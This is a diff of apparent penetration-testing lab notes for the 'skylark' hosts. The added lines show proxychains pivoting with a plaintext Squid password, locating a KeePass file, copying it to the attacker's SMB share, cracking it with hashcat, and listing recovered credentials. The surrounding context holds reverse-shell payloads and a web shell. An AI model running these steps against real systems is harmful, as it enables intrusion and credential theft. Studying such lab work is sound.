@@ -883,24 +883,33 @@ bash -p
 /var/www/html/oscommerce/catalog/install/includes
 ```
 
-.224
-```
+.224 (amsterdam)
+```bash
 nmap 192.168.248.224
 sudo nmap -sU --open -p 161 192.168.248.224
-sudo nmap -p- -Pn 192.168.248.224 -sS -T 5 --verbose
-nmap -sT -A -p 8000,3128 192.168.248.224
+sudo nmap -p- -Pn 192.168.194.224 -sS -T 5 --verbose
+nmap -sT -A -p 8000,3128 192.168.194.224
 
 # ports open: 22, 3128 (squid), 8000
 
 # enumerate squid - Squid http proxy 4.10
 # https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid
 # Squid is a caching and forwarding HTTP web proxy.
+# Squid Proxy: ext_acc DoNotShare!SkyLarkLegacyInternal2008
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.194.224:3128/
 
 # enumerate webserver
 whatweb 192.168.248.224:8000
 
 feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.224:8000
 # find http://192.168.248.224:8000/debug.txt, is just output of ifconfig, showing connection to interntal 172.x network
+
+# can scan internal network 172.16.124.32 with proxychains -> 32 gives you cred for 30
+# proxychains conf /etc/proxychains4.conf
+http 192.168.194.224 3128 ext_acc DoNotShare!SkyLarkLegacyInternal2008
+# nmap with st
+
+sudo proxychains nmap -sT -A 172.16.124.32
 ```
 
 .225 (singapore) (standalone)
@@ -942,7 +951,7 @@ feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-File
 http://192.168.248.225:8090/backend/default/uploads/shell.php
 ```
 
-.224 privesc
+.225 privesc
 ```
 wget http://192.168.45.160/linpeas.sh -O linpeas.sh
 
@@ -1053,9 +1062,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=443 -f aspx
 ```
 
 .226 privesc
-```
+```bash
 # find unquoted services
-wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+# wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
 
 icacls "Development Binaries 01"
 # we have write perms on the dir but not the exe inside of it, so we can do unquoted service paths exploit
@@ -1068,6 +1077,30 @@ sc.exe start DevService
 
 Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue
 Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue
+
+# look for kdbx
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+impacket-smbserver -smb2support smb smb
+net use \\192.168.45.229\smb
+copy Passwords.kdbx \\192.168.45.229\smb
+keepass2john Passwords.kdbx > keepass.hash
+# modify the hash to remove the filename
+
+wget https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt
+
+hashcat -m 13400 keepass.hash fasttrack.txt --force
+# returns P@ssword!
+
+kpcli --kdb=/home/kali/skylark/Passwords.kdbx
+
+# j.local 5iQ78OU2JHAAKbQc5XAr
+# Hitoshi xsYu9XPYNu9dBfHo8L4k
+# Squid Proxy: ext_acc DoNotShare!SkyLarkLegacyInternal2008
+# ann.sales  B9aL9lbDOlNkGmJxusmi
+# Hitoshi@skylark.com ganbatteyo!123
+
+
 ```
 
 .227 (192)
